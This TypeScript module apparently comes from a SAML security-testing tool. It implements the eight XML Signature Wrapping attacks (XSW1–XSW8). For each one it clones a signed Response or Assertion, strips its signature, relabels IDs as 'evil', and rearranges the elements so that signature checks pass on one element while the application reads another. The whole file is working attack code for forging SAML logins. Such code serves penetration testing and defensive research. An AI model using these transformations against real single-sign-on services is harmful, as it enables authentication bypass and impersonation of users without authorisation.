import {
  SAML_ASSERTION_NS,
  SAML_PROTOCOL_NS,
  XML_SIGNATURE_NS,
} from "../namespaces";
import { parseXml, serializeXml } from "../xml";

import { isAbsent, type Maybe } from "@/utils";

export const EVIL_RESPONSE_ID = "_evil_response_ID";

export const EVIL_ASSERTION_ID = "_evil_assertion_ID";

export type XswVariant =
  | "XSW1"
  | "XSW2"
  | "XSW3"
  | "XSW4"
  | "XSW5"
  | "XSW6"
  | "XSW7"
  | "XSW8";

export type XswOutcome =
  | { kind: "Ok"; xml: string; description: string }
  | { kind: "NotApplicable"; reason: string };

type SignedTarget = "Response" | "Assertion";

const readResponse = (document: Document): Maybe<Element> => {
  const root = document.documentElement;
  return root.namespaceURI === SAML_PROTOCOL_NS && root.localName === "Response"
    ? root
    : undefined;
};

const readChildElement = (
  parent: Element,
  namespace: string,
  localName: string,
): Maybe<Element> =>
  Array.from(parent.children).find(
    (child) =>
      child.namespaceURI === namespace && child.localName === localName,
  );

const stripSignatures = (element: Element): Element => {
  for (const signature of Array.from(
    element.getElementsByTagNameNS(XML_SIGNATURE_NS, "Signature"),
  )) {
    signature.parentElement?.removeChild(signature);
  }
  return element;
};

const cloneWithoutSignatures = (element: Element): Element =>
  stripSignatures(element.cloneNode(true) as Element);

const cloneAsSigned = (element: Element): Element => {
  const clone = element.cloneNode(true) as Element;
  const enveloped = readChildElement(clone, XML_SIGNATURE_NS, "Signature");
  if (!isAbsent(enveloped)) clone.removeChild(enveloped);
  return clone;
};

const qualify = (reference: Element, localName: string): string =>
  isAbsent(reference.prefix) ? localName : `${reference.prefix}:${localName}`;

const createNear = (
  reference: Element,
  namespace: string,
  localName: string,
): Element =>
  reference.ownerDocument.createElementNS(
    namespace,
    qualify(reference, localName),
  );

type Surgery = {
  target: SignedTarget;
  describe: (id: string) => string;
  operate: (input: {
    response: Element;
    signed: Element;
    signature: Element;
  }) => void;
};

const SURGERIES: Record<XswVariant, Surgery> = {
  XSW1: {
    target: "Response",
    describe: (id) =>
      `Cloned the signed Response (ID ${id}) without its signature, nested the clone inside the Signature, and renamed the in-place Response to ${EVIL_RESPONSE_ID}.`,
    operate: ({ response, signature }) => {
      const benign = cloneAsSigned(response);
      response.setAttribute("ID", EVIL_RESPONSE_ID);
      signature.appendChild(benign);
    },
  },

  XSW2: {
    target: "Response",
    describe: (id) =>
      `Cloned the signed Response (ID ${id}) without its signature, inserted the clone immediately before the Signature, and renamed the in-place Response to ${EVIL_RESPONSE_ID}.`,
    operate: ({ response, signature }) => {
      const benign = cloneAsSigned(response);
      response.setAttribute("ID", EVIL_RESPONSE_ID);
      response.insertBefore(benign, signature);
    },
  },

  XSW3: {
    target: "Assertion",
    describe: (id) =>
      `Inserted a signature-stripped copy of the signed Assertion (ID ${id}) before it, carrying ID ${EVIL_ASSERTION_ID}.`,
    operate: ({ response, signed }) => {
      const evil = cloneWithoutSignatures(signed);
      evil.setAttribute("ID", EVIL_ASSERTION_ID);
      response.insertBefore(evil, signed);
    },
  },

  XSW4: {
    target: "Assertion",
    describe: (id) =>
      `Appended a signature-stripped copy of the signed Assertion (ID ${id}) carrying ID ${EVIL_ASSERTION_ID}, and nested the original inside it.`,
    operate: ({ response, signed }) => {
      const evil = cloneWithoutSignatures(signed);
      evil.setAttribute("ID", EVIL_ASSERTION_ID);
      response.appendChild(evil);
      evil.appendChild(signed);
    },
  },

  XSW5: {
    target: "Assertion",
    describe: (id) =>
      `Renamed the signed Assertion in place to ${EVIL_ASSERTION_ID} and appended a signature-stripped copy still carrying ID ${id}.`,
    operate: ({ response, signed }) => {
      const benign = cloneAsSigned(signed);
      signed.setAttribute("ID", EVIL_ASSERTION_ID);
      response.appendChild(benign);
    },
  },

  XSW6: {
    target: "Assertion",
    describe: (id) =>
      `Renamed the signed Assertion in place to ${EVIL_ASSERTION_ID} and nested a signature-stripped copy still carrying ID ${id} inside its Signature.`,
    operate: ({ signed, signature }) => {
      const benign = cloneAsSigned(signed);
      signed.setAttribute("ID", EVIL_ASSERTION_ID);
      signature.appendChild(benign);
    },
  },

  XSW7: {
    target: "Assertion",
    describe: (id) =>
      `Inserted an Extensions element before the signed Assertion holding a signature-stripped copy that reuses ID ${id}.`,
    operate: ({ response, signed }) => {
      const evil = cloneWithoutSignatures(signed);
      const extensions = createNear(response, SAML_PROTOCOL_NS, "Extensions");
      extensions.appendChild(evil);
      response.insertBefore(extensions, signed);
    },
  },

  XSW8: {
    target: "Assertion",
    describe: (id) =>
      `Nested a signature-stripped copy of the Assertion, reusing ID ${id}, inside a new Object element under its Signature.`,
    operate: ({ signed, signature }) => {
      const benign = cloneAsSigned(signed);
      const object = createNear(signature, XML_SIGNATURE_NS, "Object");
      object.appendChild(benign);
      signature.appendChild(object);
    },
  },
};

const readSigned = (
  document: Document,
  target: SignedTarget,
): { response: Element; signed: Element; signature: Element } | string => {
  const response = readResponse(document);
  if (isAbsent(response)) return "this message is not a SAML Response";

  const signed =
    target === "Response"
      ? response
      : readChildElement(response, SAML_ASSERTION_NS, "Assertion");
  if (isAbsent(signed)) return "this Response carries no Assertion";

  if (isAbsent(signed.getAttribute("ID"))) {
    return `the ${target} has no ID attribute to reference`;
  }

  const signature = readChildElement(signed, XML_SIGNATURE_NS, "Signature");
  if (isAbsent(signature)) return `the ${target} carries no signature`;

  return { response, signed, signature };
};

export const isXswApplicable = (
  document: Document,
  variant: XswVariant,
): boolean =>
  typeof readSigned(document, SURGERIES[variant].target) !== "string";

export const applyXsw = (
  document: Document,
  variant: XswVariant,
): XswOutcome => {
  const surgery = SURGERIES[variant];
  const clone = document.cloneNode(true) as Document;
  const found = readSigned(clone, surgery.target);

  if (typeof found === "string") {
    return { kind: "NotApplicable", reason: found };
  }

  const id = found.signed.getAttribute("ID") ?? "";
  surgery.operate(found);

  const xml = serializeXml(clone);
  if (parseXml(xml).kind !== "Ok") {
    return {
      kind: "NotApplicable",
      reason: "the transformation produced XML that no longer parses",
    };
  }

  return { kind: "Ok", xml, description: surgery.describe(id) };
};

export const XSW_VARIANTS: ReadonlyArray<XswVariant> = [
  "XSW1",
  "XSW2",
  "XSW3",
  "XSW4",
  "XSW5",
  "XSW6",
  "XSW7",
  "XSW8",
];

export const readXswTarget = (variant: XswVariant): SignedTarget =>
  SURGERIES[variant].target;
